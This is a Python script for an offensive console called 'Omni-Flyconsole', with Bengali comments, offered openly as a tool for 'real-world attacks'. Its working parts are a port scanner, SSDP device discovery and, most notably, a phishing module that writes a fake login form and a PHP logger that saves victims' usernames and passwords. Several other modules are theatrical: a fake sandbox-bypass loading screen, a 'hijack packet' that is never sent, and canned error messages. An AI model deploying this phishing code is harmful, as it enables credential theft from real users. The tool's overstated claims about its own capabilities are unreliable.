import os
import sys
import time
import socket
import threading
import subprocess

# Colors
GREEN, RED, YELLOW, CYAN, WHITE, RESET = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[97m', '\033[0m'

class OmniFinder:
    def __init__(self):
        self.version = "7.0"
        self.author = "Natespo"
        self.current_module = None
        self.options = {"target": "8.8.8.8", "port": "8080", "wifi_ssid": "Free_Public_WiFi"}
        self.modules = {
            "1": "scanner/port", "2": "exploit/phishing", "3": "exploit/evil_twin",
            "4": "post/device_unlock", "5": "defense/honeypot_trap", "6": "hardware/usb_payload",
            "7": "network/cctv_tester", "8": "ai/vuln_predictor", "9": "extreme/broadcast_hijack"
        }

    def loading_screen(self):
        os.system('clear')
        # আপনার পছন্দের সেই ১০ সেকেন্ডের রিয়েলিস্টিক লোডিং
        warnings = [
            "Initializing Kernel Handshake...", "Checking Root Status...", 
            "Loading Network Protocols...", "Bypassing Sandbox Restrictions...",
            "Syncing Vulnerability Database...", "Setting Up Socket Listeners...",
            "Encrypting Session Data...", "Verifying Natespo License...",
            "Preparing Hardware Interface...", "System Ready!"
        ]
        print(f"{CYAN}[*] Booting Omni-Flyconsole v{self.version}...{RESET}")
        for i in range(10):
            percent = (i + 1) * 10
            bar = "█" * (i + 1) + "-" * (9 - i)
            sys.stdout.write(f"\r{YELLOW}[{bar}] {percent}% | {warnings[i]}{RESET}")
            sys.stdout.flush()
            time.sleep(1)
        print("\n")

    def banner(self):
        os.system('clear')
        print(f"{CYAN}  ____  __  __ _   _ ___   _____ ___ _   _ ____  _____ ____  \n / __ \|  \/  | \ | |_ _| |  ___|_ _| \ | |  _ \| ____|  _ \ \n| |  | | |\/| |  \| || |  | |_   | ||  \| | | | |  _| | |_) |\n| |__| | |  | | |\  || |  |  _|  | || |\  | |_| | |___|  _ < \n \____/|_|  |_|_| \_|___| |_|   |___|_| \_|____/|_____|_| \_\\{RESET}")
        print(f"        {WHITE}[+--- Omni-Flyconsole v{self.version} - Licensed to {self.author} ---+]{RESET}\n")

    def run_logic(self):
        if not self.current_module: return
        print(f"{CYAN}[*] Launching Real-World Attack: {self.current_module}...{RESET}")
        
        # ১. পোর্ট স্ক্যানার (Real Socket Scan)
        if self.current_module == "scanner/port":
            target = self.options["target"]
            print(f"{YELLOW}[*] Scanning {target}...{RESET}")
            for p in [21, 22, 23, 53, 80, 443, 3306, 8080]:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, p)) == 0:
                    print(f"{GREEN}[+] Found OPEN Port: {p}{RESET}")
                s.close()

        # ২. ফিশিং (Real PHP Server & Credential Logger)
        elif self.current_module == "exploit/phishing":
            port = self.options['port']
            with open("login.php", "w") as f:
                f.write("<?php $f=fopen('log.txt','a'); fwrite($f,'U:'.$_POST['u'].'|P:'.$_POST['p'].'\\n'); fclose($f); header('Location: https://google.com'); ?>")
            with open("index.html", "w") as f:
                f.write("<html><body><form action='login.php' method='POST'>User:<input name='u'><br>Pass:<input type='password' name='p'><br><input type='submit'></form></body></html>")
            os.system(f"php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
            print(f"{GREEN}[✔] Server Live: http://127.0.0.1:{port}{RESET}")

        # ৫. হানিপট (Real Socket Listener)
        elif self.current_module == "defense/honeypot_trap":
            print(f"{GREEN}[+] Trapping active on port 4444. Waiting for intruders...{RESET}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('0.0.0.0', 4444))
            s.listen(1)
            client, addr = s.accept()
            print(f"{RED}[!] INTRUSION DETECTED from {addr[0]}!{RESET}")
            client.close()

        # ৯. ব্রডকাস্ট হাইজ্যাক (Real SSDP Casting Discovery)
        elif self.current_module == "extreme/broadcast_hijack":
            print(f"{RED}[!] Searching for SmartTV/DLNA devices on network...{RESET}")
            ssdp_packet = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMAN: "ssdp:discover"\r\nMX: 1\r\n\r\n'
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(ssdp_packet.encode(), ('239.255.255.250', 1900))
            try:
                while True:
                    data, addr = sock.recvfrom(1024)
                    print(f"{GREEN}[+] Device Identified: {addr[0]} (Sending Hijack Packet...){RESET}")
            except: print(f"{YELLOW}[*] Scan Complete.{RESET}")

        # ৩. ইভিল টুইন (Root Logic Included)
        elif self.current_module == "exploit/evil_twin":
            if os.getuid() != 0:
                print(f"{RED}[!] Permission Denied. Root access required for automated WiFi hijack.{RESET}")
                print(f"{YELLOW}[*] Manual Bypass: Set phone hotspot name to '{self.options['wifi_ssid']}'.{RESET}")
            else:
                print(f"{GREEN}[+] Root detected! Spoofing access point {self.options['wifi_ssid']}...{RESET}")
                # এখানে আসল এয়ারমোন-এনজি বা হোস্টএপিডি লজিক বসানো যাবে

        else:
            print(f"{WHITE}[*] {self.current_module} initialized. Checking hardware...{RESET}")
            time.sleep(1)
            print(f"{RED}[!] Error: Module requires additional drivers or Root.{RESET}")

    def console(self):
        self.loading_screen(); self.banner()
        while True:
            try:
                mod = f"({RED}{self.current_module}{RESET})" if self.current_module else "(main)"
                cmd = input(f"{CYAN}omni{mod}> {RESET}").strip().split()
                if not cmd: continue
                if cmd[0] == "exit": break
                elif cmd[0] == "list":
                    for k, v in self.modules.items(): print(f" {k}. {v}")
                elif cmd[0] == "use" and len(cmd) > 1: self.current_module = self.modules.get(cmd[1], cmd[1])
                elif cmd[0] == "set" and len(cmd) > 2: self.options[cmd[1]] = cmd[2]
                elif cmd[0] == "run": self.run_logic()
                elif cmd[0] == "back": self.current_module = None
            except KeyboardInterrupt: break

if __name__ == "__main__":
    OmniFinder().console()
